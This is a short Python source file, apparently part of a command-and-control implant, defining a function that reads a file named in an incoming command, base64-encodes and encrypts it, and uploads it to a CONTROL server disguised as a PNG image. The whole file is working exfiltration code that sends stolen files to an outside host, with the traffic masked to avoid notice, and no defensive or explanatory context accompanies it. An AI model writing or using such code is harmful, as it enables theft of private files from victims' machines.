import base64
import requests
from constants import CONTROL
import pyutils.encryption_utils as eu

def downloader(message):
    path, filename = message.split(" ")[1:]
    try:
        with open(path, 'rb') as f:
            file_u = base64.b64encode(f.read()).decode('utf-8')
            file = eu.encrypt(file_u)
            requests.post(f"{CONTROL}/upload", files={'image': (filename, file, 'image/png')})
            return "Sent post request"
    except Exception as e:
        return e
    